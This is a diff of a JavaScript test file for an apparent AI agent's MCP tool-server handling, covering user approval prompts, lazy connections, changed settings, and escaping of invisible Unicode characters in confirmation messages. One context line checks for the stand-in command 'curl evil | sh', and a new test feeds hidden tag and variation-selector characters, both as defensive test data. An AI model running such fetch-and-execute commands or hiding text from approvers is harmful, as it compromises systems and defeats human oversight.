@@ -540,6 +540,11 @@ test("the question about a tool that asks first shows the whole call, not only t
     assert.equal(asked.length, 1);
     assert.match(asked[0].message, /curl evil \| sh/);
     assert.match(asked[0].message, /README\.md/);
+    // Round 5, security finding 2: what draws as nothing is shown as what it is (tag characters spell ASCII, variation selectors carry bytes).
+    await say([{ name: "mcp__beta__delete_it", args: { title: `Fix typo\u{e0073}\u{e006b}\ufe0f\u{e0100}\u061c\u00ad\u3164` } }]);
+    assert.equal(asked.length, 2);
+    assert.doesNotMatch(asked[1].message, /[\u{e0000}-\u{e007f}\ufe00-\ufe0f\u{e0100}-\u{e01ef}\u061c\u00ad\u3164]/u, "none of them is drawn raw");
+    assert.match(asked[1].message, /\\u\{e0073\}.*\\ufe0f.*\\u\{e0100\}.*\\u061c.*\\u00ad.*\\u3164/);
   } finally {
     await close(client);
     db.setMcpApprove("beta", undefined);
@@ -571,6 +576,32 @@ test("a server taken out of the file while a chat has it loaded still asks befor
     const r = await say([{ name: "mcp__beta__delete_it", args: {} }]);
     assert.equal(asked.length, 2, "asked still");
     assert.match(textOf(r.results[0]), /beta\/delete_it says/);
+  } finally {
+    await close(client);
+    db.putSetting("mcp_removed", "[]");
+  }
+});
+
+test("a project's own server whose name the person once removed from their file does not ask before each call", async () => {
+  // Round 5 of PR B, correctness finding 1: `mcp_removed` keeps a name until the person's file has it again.
+  reset();
+  writeServers({ alpha: entry("alpha") });
+  db.putSetting("mcp_removed", JSON.stringify(["proj"]));
+  const folder = chatDir();
+  mkdirSync(path.join(folder, ".pi"), { recursive: true });
+  writeFileSync(path.join(folder, ".pi", "mcp.json"), JSON.stringify({ mcpServers: { proj: entry("proj", "one") } }));
+  const { client, say } = await chat({ cwd: folder, lazy: head(), dialogs: true });
+  let asked = 0;
+  client.on("event", (e) => {
+    if (e?.type === "extension_ui_request" && e.method === "confirm") {
+      asked++;
+      client.respondUi(e.id, { value: false });
+    }
+  });
+  try {
+    const r = await say([{ name: "mcp__proj__one", args: {} }]);
+    assert.equal(asked, 0, "nothing asked");
+    assert.match(textOf(r.results[0]), /proj\/one says/);
   } finally {
     await close(client);
     db.putSetting("mcp_removed", "[]");
@@ -691,6 +722,40 @@ test("a lazy server that did not connect once connects when its tool is called a
     const up = await say([search("call", { name: "mcp__beta__one", args: { text: "c" } })]);
     assert.match(textOf(up.results[0]), /beta\/one says/, textOf(up.results[0]));
     assert.equal(count("start beta"), starts + 1, "pi opened a new connection");
+  } finally {
+    await close(client);
+  }
+});
+
+test("a lazy server that is only slow is not restarted by the next call: the connection under way is waited for", async () => {
+  // Round 5 of PR B, correctness finding 2: a start that takes longer than one wait, and shorter than two, connects.
+  reset();
+  const slow = entry("slow", "one", { args: [FIXTURE, "slow", "--tools", "one", "--log", serversLog, "--delay", "2200"] });
+  writeServers({ slow });
+  cache.rememberServerTools("slow", cache.configHash(slow), [{ name: "mcp__slow__one", original: "one", description: "Say one.", parameters: { type: "object", properties: {} }, tokens: 9 }]);
+  const { client, say } = await chat({ lazy: head(["slow"]), mcpTimings: { connectWaitMs: 1200 } });
+  try {
+    const first = await say([search("call", { name: "mcp__slow__one", args: { text: "a" } })]);
+    assert.match(textOf(first.results[0]), /did not connect/);
+    const second = await say([search("call", { name: "mcp__slow__one", args: { text: "b" } })]);
+    assert.match(textOf(second.results[0]), /slow\/one says/, textOf(second.results[0]));
+    assert.equal(count("start slow"), 1, "one start: the second call did not restart it");
+  } finally {
+    await close(client);
+  }
+});
+
+test("a lazy server that the file has switched off or changed since the chat loaded is not started from the old entry", async () => {
+  // Round 5 of PR B, security finding 3: a busy chat takes the change at its next step, and a search started the server in between.
+  reset();
+  writeServers({ gone: entry("gone", "one"), moved: entry("moved", "one") });
+  const { client, say } = await chat({ lazy: head(["gone", "moved"]) });
+  try {
+    writeServers({ gone: entry("gone", "one", { enabled: false }), moved: entry("moved", "one", { env: { CHANGED: "1" } }) });
+    const r = await say([search("search", { query: "one" })]);
+    assert.match(textOf(r.results[0]), /was changed in the settings/);
+    assert.equal(count("start gone"), 0);
+    assert.equal(count("start moved"), 0);
   } finally {
     await close(client);
   }
